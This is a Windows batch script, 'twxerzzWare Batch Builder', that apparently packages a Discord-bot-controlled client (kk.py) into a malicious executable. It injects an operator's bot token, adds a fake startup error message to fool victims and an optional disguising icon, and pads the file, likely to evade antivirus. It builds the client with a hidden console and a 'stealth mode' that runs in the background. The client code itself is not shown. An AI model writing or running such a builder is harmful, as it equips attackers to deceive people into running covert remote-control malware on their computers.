@echo off
setlocal enabledelayedexpansion
title twxerzzWare Batch Builder 🐀

echo ========================================
echo       twxerzzWare Batch Builder
echo ========================================
echo.

:: 1. Discord Bot Token
set /p token="Enter Discord Bot Token: "
if "%token%"=="" (
    echo [!] Token cannot be empty!
    pause
    exit /b
)

:: 2. Icon Path
echo.
echo [Optional] Enter path to .ico file (or press Enter to skip):
set /p icon_path=""

:: 3. Fake Error
echo.
set /p fake_error_enable="Enable Fake Error Message? (y/n): "
set "fake_err_enabled=False"
set "fake_err_msg=The application failed to start correctly (0xc000007b)."
if /i "%fake_error_enable%"=="y" (
    set "fake_err_enabled=True"
    set /p fake_err_msg="Enter Fake Error Message: "
)

:: 4. File Padding
echo.
set /p padding_mb="Enter File Padding in MB (e.g., 5 or 0 to skip): "
if "%padding_mb%"=="" set "padding_mb=0"

:: 5. Stealth Mode
echo.
set /p stealth_mode_input="Stealth Mode (Hide & Run in background)? (y/n) [Default: y]: "
set "stealth_mode=True"
if /i "%stealth_mode_input%"=="n" set "stealth_mode=False"

echo.
echo ========================================
echo Building... Please wait.
echo ========================================

:: Create replacement script
echo import sys > patcher.py
echo with open('kk.py', 'r', encoding='utf-8') as f: content = f.read() >> patcher.py
echo content = content.replace('[BOT_TOKEN]', r'%token%') >> patcher.py
echo content = content.replace('[FAKE_ERROR_ENABLED]', r'%fake_err_enabled%') >> patcher.py
echo content = content.replace('[FAKE_ERROR_MESSAGE]', r'%fake_err_msg%') >> patcher.py
echo content = content.replace('[STEALTH_MODE]', r'%stealth_mode%') >> patcher.py
echo with open('temp_client.py', 'w', encoding='utf-8') as f: f.write(content) >> patcher.py

python patcher.py
if %ERRORLEVEL% neq 0 (
    echo [!] Failed to patch kk.py
    pause
    exit /b
)

:: Build Command
set "pyinstaller_cmd=python -m PyInstaller --onefile --noconsole --name kk_built"
if not "%icon_path%"=="" (
    if exist "%icon_path%" (
        set "pyinstaller_cmd=%pyinstaller_cmd% --icon %icon_path%"
    ) else (
        echo [!] Icon file not found, skipping icon...
    )
)
set "pyinstaller_cmd=%pyinstaller_cmd% temp_client.py"

:: Execute Build
%pyinstaller_cmd%
if %ERRORLEVEL% neq 0 (
    echo.
    echo [!] PyInstaller failed! Make sure PyInstaller is installed.
    echo [!] You can install it with: pip install pyinstaller
    pause
    exit /b
)

:: Add Padding
if not "%padding_mb%"=="0" (
    echo Adding %padding_mb% MB of padding...
    echo with open('dist/kk_built.exe', 'ab') as f: f.write(b'\x00' * (%padding_mb% * 1024 * 1024)) > pad.py
    python pad.py
    del pad.py
)

:: Success and Cleanup
move dist\kk_built.exe . >nul
rd /s /q build >nul
rd /s /q dist >nul
del kk_built.spec >nul
del temp_client.py >nul
del patcher.py >nul

echo.
echo ========================================
echo Build Finished Successfully!
echo Final File: kk_built.exe
echo ========================================
pause
